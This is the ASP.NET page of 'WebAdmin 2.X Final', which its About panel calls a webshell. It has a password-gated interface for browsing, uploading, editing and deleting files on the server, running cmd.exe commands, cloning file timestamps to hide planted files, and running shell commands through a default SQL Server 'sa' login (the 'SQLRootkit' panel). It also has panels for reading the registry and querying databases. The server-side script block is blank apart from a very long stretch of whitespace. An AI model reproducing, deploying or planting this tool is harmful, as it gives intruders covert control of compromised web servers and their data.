<%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="Microsoft.Win32" %>
<%@ import Namespace="System.Data" %>
<%@ import Namespace="System.Data.OleDb" %>
<script runat="server">

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          

</script>
<html>
<head>
    <title>:: WebAdmin 2.X Final ::</title> <style type="text/css">BODY {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
TD {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
TH {
	COLOR: #0000ff; FONT-FAMILY: Verdana
}
BODY {
	FONT-SIZE: 14px; BACKGROUND-COLOR: #ffffff
}
A:link {
	COLOR: #0000ff; TEXT-DECORATION: none
}
A:visited {
	COLOR: #0000ff; TEXT-DECORATION: none
}
A:hover {
	COLOR: #ff0000; TEXT-DECORATION: none
}
A:active {
	COLOR: #ff0000; TEXT-DECORATION: none
}
.buttom {
	BORDER-RIGHT: #084b8e 1px solid; BORDER-TOP: #084b8e 1px solid; BORDER-LEFT: #084b8e 1px solid; COLOR: #ffffff; BORDER-BOTTOM: #084b8e 1px solid; BACKGROUND-COLOR: #719bc5
}
.TextBox {
	BORDER-RIGHT: #084b8e 1px solid; BORDER-TOP: #084b8e 1px solid; BORDER-LEFT: #084b8e 1px solid; BORDER-BOTTOM: #084b8e 1px solid
}
.style3 {
	COLOR: #ff0000
}
</style>
    <meta http-equiv="Content-Type" content="text/html" />
</head>
<body>
    <form method="post" enctype="multipart/form-data" runat="server">
        <asp:Label id="Label_Info" runat="server" enableviewstate="False"></asp:Label>
        <br />
        <br />
        <asp:Panel id="ULOGIN" runat="server" Wrap="False" ToolTip="Login">
            <asp:Label id="Label_Pwd" runat="server" enableviewstate="False">Password:</asp:Label>
            <asp:TextBox class="TextBox" id="UPass" runat="server" Wrap="False" TextMode="Password"></asp:TextBox>
            <asp:Button class="buttom" id="Button_Login" onclick="login_click" runat="server" ToolTip="Click here to login" Text="Login"></asp:Button>
        </asp:Panel>
        <asp:Panel id="MAIN" runat="server" Wrap="False" ToolTip="Main" Visible="False">
            <asp:Label id="Label_tools" runat="server" enableviewstate="False">Function:</asp:Label>
            <asp:Button class="buttom" id="Button_filemanager" onclick="ShowFileM" runat="server" Text="File" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_cmd" onclick="Button_showcmd_Click" runat="server" Text="Command" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_clonetime" onclick="Button_showclone_Click" runat="server" Text="CloneTime" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_sqlcmd" onclick="Button_showcmdshell_Click" runat="server" Text="SQLRootkit" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_sysinfo" onclick="Button_showinfo_Click" runat="server" Text=" SysInfo " Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_db" onclick="ShowData" runat="server" Text="Database" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_reg" onclick="ShowReg" runat="server" Text="Regedit" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_about" onclick="ShowAbout" runat="server" Text="About" Width="80px"></asp:Button>
            <asp:Button class="buttom" id="Button_exit" onclick="Logout_click" runat="server" Text="Exit" Width="80px"></asp:Button>
            <hr />
        </asp:Panel>
        <asp:Panel id="FileManager" runat="server" Wrap="False" Width="100%">
            <asp:Label id="Label_Drives" runat="server" enableviewstate="False"></asp:Label>
            <br />
            <asp:Label id="Label_Dir" runat="server" enableviewstate="False">Currently Dir :</asp:Label>
            <asp:TextBox class="TextBox" id="CDir" runat="server" Wrap="False" Width="300px"></asp:TextBox>
            <asp:Button class="buttom" id="Button_GoTo" onclick="GoTo_click" runat="server" ToolTip="Go to the dir" Text=" Go "></asp:Button>
            <asp:Button id="PlasteButton" onclick="Plaste_Click" runat="server" Text="Plaste" CssClass="buttom"></asp:Button>
            <br />
            <asp:Label id="Label_oper" runat="server" enableviewstate="False">Operate:</asp:Label>
            <asp:TextBox class="TextBox" id="TextBox_FDName" runat="server" Wrap="False" Width="100px"></asp:TextBox>
            <asp:Button class="buttom" id="Button_NewF" onclick="NewFile" runat="server" Text="NewFile"></asp:Button>
            <asp:Button class="buttom" id="Button_NewD" onclick="NewFolder" runat="server" Text="NewDir"></asp:Button>
            <input class="TextBox" id="UpFile" type="file" name="upfile" runat="server" />
            <asp:Button class="buttom" id="Button_UpFile" onclick="UpLoad" runat="server" Text="UpLoad" EnableViewState="False"></asp:Button>
            <HT>
                <br />
                <asp:Label id="Label_files" runat="server" enableviewstate="False" font-size="XX-Small" width="800px"></asp:Label>
                </asp:Panel>
        <asp:Panel id="CMD" runat="server" Wrap="False" ToolTip="CMD" Visible="False" Width="380px">
            <asp:Label id="Label_cmdpath" runat="server" enableviewstate="False" width="100px">Program
            : </asp:Label>
            <asp:TextBox class="TextBox" id="CMDPath" runat="server" Wrap="False" Text="cmd.exe" Width="250px">c:\windows\system32\cmd.exe</asp:TextBox>
            <br />
            <asp:Label id="Label_cmd" runat="server" enableviewstate="False" width="100px">Arguments
            :</asp:Label>
            <asp:TextBox class="TextBox" id="CMDCommand" runat="server" Wrap="False" Width="250px">/c ver</asp:TextBox>
            <asp:Button class="buttom" id="Button_cmdRun" onclick="RunCMD" runat="server" Text="Run" EnableViewState="False"></asp:Button>
            <br />
            <asp:Label id="cmdResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="CloneTime" runat="server" Wrap="False" ToolTip="Clone Time" Visible="False">
            <asp:Label id="Label_rework" runat="server">Rework File or Dir:</asp:Label>
            <asp:TextBox class="TextBox" id="time1" runat="server" Wrap="False" Width="400px">c:\webadmin2XF.aspx</asp:TextBox>
            <br />
            <asp:Label id="Label_copied" runat="server">Copied File or Dir : </asp:Label>
            <asp:TextBox class="TextBox" id="time2" runat="server" Wrap="False" Width="400px">c:\index.aspx</asp:TextBox>
            <br />
            <asp:Button class="buttom" id="Button_clone" onclick="GoCloneTime" runat="server" Text="Clone"></asp:Button>
            <br />
            <asp:Label id="Label_cloneResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="SQLRootkit" runat="server" Wrap="False" ToolTip="SQLRootKit" Visible="False">
            <asp:Label id="Label_conn" runat="server" width="100px">ConnString:</asp:Label>
            <asp:TextBox class="TextBox" id="ConStr" runat="server" Wrap="False" Width="500px">server=127.0.0.1;UID=sa;PWD=;Provider=SQLOLEDB</asp:TextBox>
            <br />
            <asp:Label id="Label_sqlcmd" runat="server" width="100px">Command:</asp:Label>
            <asp:TextBox class="TextBox" id="SQLCmd" runat="server" Wrap="False" Width="500px">net user</asp:TextBox>
            <asp:Button class="buttom" id="SQLCmdRun" onclick="CMDSHELL" runat="server" Text="Run"></asp:Button>
            <br />
            <asp:Label id="resultSQL" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="SysInfo" runat="server" Wrap="False" ToolTip="System Infomation" Visible="False" EnableViewState="False">
            <table width="80%" align="center" border="1">
                <tbody>
                    <tr>
                        <td colspan="2">
                            Web Server Information</td>
                    </tr>
                    <tr>
                        <td width="40%">
                            Server IP</td>
                        <td width="60%">
                            <asp:Label id="ServerIP" runat="server" enableviewstate="False"></asp:Label></td>
                    </tr>
                    <tr>
                        <td height="73">
                            Machine Name</td>
                        <td>
                            <asp:Label id="MachineName" runat="server" enableviewstate="False"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            Network Name</td>
                        <td>
                            <asp:Label id="UserDomainName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            User Name in this Process</td>
                        <td>
                            <asp:Label id="UserName" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            OS Version</td>
                        <td>
                            <asp:Label id="OS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            Started Time</td>
                        <td>
                            <asp:Label id="StartTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            System Time</td>
                        <td>
                            <asp:Label id="NowTime" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            IIS Version</td>
                        <td>
                            <asp:Label id="IISV" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            HTTPS</td>
                        <td>
                            <asp:Label id="HTTPS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            PATH_INFO</td>
                        <td>
                            <asp:Label id="PATHS" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            PATH_TRANSLATED</td>
                        <td>
                            <asp:Label id="PATHS2" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            SERVER_PORT</td>
                        <td>
                            <asp:Label id="PORT" runat="server"></asp:Label></td>
                    </tr>
                    <tr>
                        <td>
                            SeesionID</td>
                        <td>
                            <asp:Label id="SID" runat="server"></asp:Label></td>
                    </tr>
                </tbody>
            </table>
        </asp:Panel>
        <asp:Panel id="DATA" runat="server" Wrap="False" ToolTip="Manage Database" Visible="False">
            <asp:Label id="label_datacs" runat="server" width="120px">ConnString :</asp:Label>
            <asp:TextBox class="TextBox" id="DataCStr" runat="server" Wrap="False" Width="500px">Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\MyWeb\UpdateWebadmin\guestbook.mdb</asp:TextBox>
            <br />
            <asp:Label id="Label_datatype" runat="server" width="120px">Database Type:</asp:Label>
            <asp:RadioButton id="Type_SQL" runat="server" Text="MSSQL" Width="80px" CssClass="buttom" OnCheckedChanged="DB_onrB_1" GroupName="DBType" AutoPostBack="True"></asp:RadioButton>
            <asp:RadioButton id="Type_Acc" runat="server" Text="Access" Width="80px" CssClass="buttom" OnCheckedChanged="DB_onrB_2" GroupName="DBType" AutoPostBack="True" Checked="True"></asp:RadioButton>
            <asp:Button class="buttom" id="DB_Submit" onclick="DB_Submit_Click" runat="server" Text="Submit" Width="80px"></asp:Button>
            <br />
            <asp:Label id="db_showTable" runat="server"></asp:Label>
            <br />
            <asp:Label id="DB_exe" runat="server" height="37px" visible="False">Execute SQL :</asp:Label>
            <asp:TextBox id="DB_EString" runat="server" TextMode="MultiLine" Visible="false" Width="500" CssClass="TextBox" Height="50px"></asp:TextBox>
            <asp:Button id="DB_eButton" onclick="DB_Exec_Click" runat="server" Text="Exec" Visible="false" CssClass="buttom"></asp:Button>
            <br />
            <asp:Label id="DB_ExecRes" runat="server"></asp:Label>
            <br />
            <asp:DataGrid id="DB_DataGrid" runat="server" Width="800px" with="100%" AllowPaging="true" AllowSorting="true" OnSortCommand="DB_Sort" PageSize="20" OnPageIndexChanged="DB_Page" PagerStyle-Mode="NumericPages">
                <PagerStyle mode="NumericPages"></PagerStyle>
            </asp:DataGrid>
        </asp:Panel>
        <asp:Panel id="reg" runat="server" Wrap="False" ToolTip="Read Regedit" Visible="False">
            <asp:Label id="label_rkey" runat="server" width="80px">Key :</asp:Label>
            <asp:TextBox class="TextBox" id="RegKey" runat="server" Wrap="False" Width="500px">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName</asp:TextBox>
            <br />
            <asp:Label id="label_rV" runat="server" width="80px">Value:</asp:Label>
            <asp:TextBox class="TextBox" id="RegValue" runat="server" Wrap="False" Width="200px">ComputerName</asp:TextBox>
            <asp:Button class="buttom" id="ReadReg_Click" onclick="ReadReg" runat="server" Text="Read"></asp:Button>
            <br />
            <br />
            <asp:Label id="RegResult" runat="server"></asp:Label>
        </asp:Panel>
        <asp:Panel id="about" runat="server" Wrap="False" ToolTip="about WebAdmin 2.X Final" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <br />
            <br />
            <asp:Label id="label_about" runat="server" width="80px">WebAdmin 2.X Final is a webshell
            run in ASP.Net code by&nbsp;</asp:Label>
            <asp:HyperLink id="HyperLink1" runat="server" Visible="True" Target="_blank" NavigateUrl="http://canglangjidi.qyun.net">hackwolf</asp:HyperLink>
            <br />
            <asp:Image id="Image1" runat="server" ToolTip="Build20051225" Visible="True" ImageUrl="http://j.thec.cn/canglangjidi/cljd.jpg" AlternateText="Enjoy Hacking !"></asp:Image>
        </asp:Panel>
        <asp:Panel id="File_Edit" runat="server" Wrap="False" ToolTip="Edit File" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:Label id="label_path" runat="server">File Path : </asp:Label>
            <asp:TextBox id="edited_path" runat="server" Width="300" CssClass="TextBox"></asp:TextBox>
            * 
            <br />
            <asp:TextBox id="edited_content" runat="server" TextMode="MultiLine" CssClass="TextBox" Columns="100" Rows="25"></asp:TextBox>
            <br />
            <asp:Button id="edited_Edit" onclick="FileEdit" runat="server" Text="Sumbit" CssClass="buttom"></asp:Button>
        </asp:Panel>
        <asp:Panel id="File_del" runat="server" Wrap="False" ToolTip="Delete File" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:Label id="label_del" runat="server"></asp:Label>
            <br />
            <asp:Button id="del_del" onclick="FileDel" runat="server" Text="Delete It" CssClass="buttom"></asp:Button>
        </asp:Panel>
        <asp:Panel id="File_Rename" runat="server" Wrap="False" ToolTip="Delete File" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:TextBox class="TextBox" id="btn_rename" runat="server" Wrap="False" Width="200px"></asp:TextBox>
            <asp:Button id="rn_rn" onclick="rn_rn_Click" runat="server" Text="Rename It" CssClass="buttom"></asp:Button>
        </asp:Panel>
        <asp:Panel id="File_Att" runat="server" Wrap="False" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            <asp:CheckBox class="TextBox" id="onlyread" Wrap="false" Text="ReadOnly" Width="100px" Runat="server"></asp:CheckBox>
            <asp:CheckBox class="TextBox" id="hide" Wrap="false" Text="hide" Width="100px" Runat="server"></asp:CheckBox>
            <asp:CheckBox class="TextBox" id="sys" Wrap="false" Text="sys" Width="100px" Runat="server"></asp:CheckBox>
            <asp:CheckBox class="TextBox" id="archive" Wrap="false" Text="archive" Width="100px" Runat="server"></asp:CheckBox>
            <br />
            <asp:Button id="Set_Att" onclick="Set_Att_Click" runat="server" Text="Set It" CssClass="buttom"></asp:Button>
        </asp:Panel>
        </form>
        </body>
        </html>
